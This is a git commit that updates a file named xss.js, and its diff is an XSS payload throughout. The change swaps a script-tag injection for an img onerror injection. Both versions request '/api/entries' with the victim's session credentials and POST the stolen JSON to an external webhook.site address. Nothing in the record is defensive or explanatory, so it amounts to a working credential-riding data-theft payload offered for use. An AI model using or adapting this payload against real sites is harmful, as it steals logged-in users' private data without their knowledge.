ed9e71c1b872260188927eb85276546c4735e58e
K137-Alien <106661070+KietLA1507@users.noreply.github.com>
2025-05-07 22:26:56 +0700

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,13 +1,8 @@
-<script>
-  fetch('/api/entries', {
-    credentials: 'include'
-  })
+<img src="x" onerror="fetch('/api/entries', {credentials: 'include'})
   .then(r => r.json())
   .then(data => {
-    // Gửi data đến server của bạn
     fetch('https://webhook.site/863fb66b-7f91-4ef5-98cc-66a4ee77d282', {
       method: 'POST',
       body: JSON.stringify(data)
     });
-  });
-</script>
+  });">
